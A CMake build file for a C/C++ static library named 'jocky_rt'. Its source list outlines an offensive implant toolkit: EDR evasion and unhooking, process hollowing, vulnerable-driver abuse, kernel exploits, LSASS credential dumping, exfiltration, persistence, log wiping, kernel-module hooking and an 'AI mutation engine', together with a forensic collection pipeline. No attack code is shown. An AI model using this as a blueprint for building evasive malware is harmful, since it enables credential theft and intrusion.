cmake_minimum_required(VERSION 3.16)
project(jocky_runtime C CXX)

set(CMAKE_C_STANDARD 11)
set(CMAKE_CXX_STANDARD 14)

# Runtime source files
set(RUNTIME_SOURCES
    init/anti_analysis.c
    util/mem.c
    evasion/unhook.c
    evasion/syscalls.c
    evasion/stack_spoof.c
    evasion/trusted_spoof.c
    evasion/edrhoker.c
    evasion/advanced_edr.c
    windows/evasion/edr_throttle_profiler.c
    execution/hollow.c
    execution/linux_hollow.c
    execution/inmem.c
    execution/byovd.c
    execution/driver_interact.c
    execution/linux_modules.c
    exploitation/kernel_exploit.c
    exploitation/linux_kernel.c
    exfil/exfil.c
    exfil/lsass_dump.c
    cleanup/self_delete.c
    cleanup/logs.c
    cleanup/forensics.c
    pack/stub_loader.c
    io/io.c
    memory/vmem.c
    registry/registry.c
    byovd/driver_scoring.c
    byovd/byovd_manifest.c
    byovd/byovd_modular.c

    # Linux syscall wrappers (FIXED PATHS: linux/syscalls/ not linux/)
    linux/syscalls/syscall.c
    linux/syscalls/sysinfo_syscall.c
    linux/syscalls/env_syscall.c
    linux/syscalls/file_syscall.c
    linux/syscalls/dir_syscall.c
    linux/syscalls/mem_syscall.c
    linux/syscalls/signal_syscall.c
    linux/syscalls/ipc_syscall.c
    linux/syscalls/util_syscall.c

    # Linux process operations
    linux/process/process_syscall.c
    linux/process/process_control_syscall.c
    linux/process/hollow.c
    linux/process/process_hollow.c
    linux/process/advanced_process_ops.c
    linux/process/ptrace_control.c
    linux/process/thread_hijack.c

    # Linux kernel operations
    linux/kernel/lkm_loader.c
    linux/kernel/lkm_loader.cpp
    linux/kernel/ebpf_loader.c
    linux/kernel/ebpf_evasion.cpp
    linux/kernel/ftrace_helper.c
    linux/kernel/ftrace_hooking.cpp
    linux/kernel/modules.c
    linux/kernel/advanced_syscalls.c
    linux/kernel/advanced_kernel_ops.c
    linux/kernel/module_loader.c
    linux/kernel/module_ops.c
    linux/kernel/kread_kwrite.c
    linux/kernel/byovd_ops.c

    # Linux anti-analysis
    linux/anti_analysis/artifact_hiding.cpp
    linux/anti_analysis/userland_evasion.cpp
    linux/anti_analysis/anti_analysis.c
    linux/anti_analysis/detection.c

    # Linux privilege escalation
    linux/lpe/privilege_escalation.cpp
    linux/lpe/fence2pwn.c

    # Linux core operations
    linux/core/audit_ops.c
    linux/core/runtime_init.c
    linux/core/sandbox_ops.c

    # Linux persistence
    linux/persistence.c
    linux/persistence/cron_systemd.c

    # Linux exfiltration
    linux/exfil/exfil_channels.c

    # Linux I/O
    linux/io/io_core.c

    # Linux threading
    linux/threading/threadpool.c

    # Linux networking
    linux/networking/network.c

    # Linux forensics
    linux/forensics/linux_forensics.c
    linux/forensics/cleanup.c

    # Linux missing APIs
    linux/missing_apis.c

    # Forensic analysis pipeline (Kamimi)
    forensics/forensic_engine.c
    forensics/forensics_rt.c
    forensics/forensic_utils.c
    forensics/jocky_forensics_rt_v2.c
    forensics/audit/audit_log.c
    forensics/control/capabilities.c
    forensics/engine/analysis.c
    forensics/engine/provenance.c
    forensics/plugins/collectors/evtx_collector.c
    forensics/plugins/collectors/file_collector.c
    forensics/plugins/collectors/memory_collector.c
    forensics/plugins/collectors/mft_collector.c
    forensics/plugins/collectors/network_collector.c
    forensics/plugins/collectors/prefetch_collector.c
    forensics/plugins/collectors/process_collector.c
    forensics/plugins/collectors/registry_collector.c
    forensics/plugins/collectors/usnjrnl_collector.c
    forensics/plugins/output/html_output.c
    forensics/plugins/output/json_output.c
    forensics/plugins/output/siem_forwarder.c
    forensics/plugins/output/sigma_output.c
    forensics/plugins/output/stix_output.c
    forensics/plugins/parsers/arp_parser.c
    forensics/plugins/parsers/dns_parser.c
    forensics/plugins/parsers/elf_parser.c
    forensics/plugins/parsers/evtx_parser.c
    forensics/plugins/parsers/file_parser.c
    forensics/plugins/parsers/memory_parser.c
    forensics/plugins/parsers/mft_parser.c
    forensics/plugins/parsers/network_parser.c
    forensics/plugins/parsers/prefetch_parser.c
    forensics/plugins/parsers/process_parser.c
    forensics/plugins/parsers/registry_parser.c
    forensics/store/evidence_store.c

    # AI
    ai/mutation_engine.c
)

# Platform-specific filtering
if(NOT WIN32)
    # Remove Windows-only sources on Linux (keep linux_hollow.c, linux_modules.c)
    list(REMOVE_ITEM RUNTIME_SOURCES
        evasion/unhook.c
        evasion/syscalls.c
        evasion/stack_spoof.c
        evasion/trusted_spoof.c
        execution/hollow.c
        execution/inmem.c
        execution/byovd.c
        execution/driver_interact.c
        exploitation/kernel_exploit.c
        exfil/exfil.c
        exfil/lsass_dump.c
        cleanup/forensics.c
        pack/stub_loader.c
        registry/registry.c
    )
endif()

# Static library
add_library(jocky_rt STATIC ${RUNTIME_SOURCES})
target_include_directories(jocky_rt PUBLIC include)

if(WIN32)
    target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi wevtapi)
else()
    # Linux: link against libdl for dlopen/dlsym
    target_link_libraries(jocky_rt PUBLIC dl)
endif()

# Example: build a test executable
# add_executable(rt_test tests/rt_test.c)
# target_link_libraries(rt_test jocky_rt)
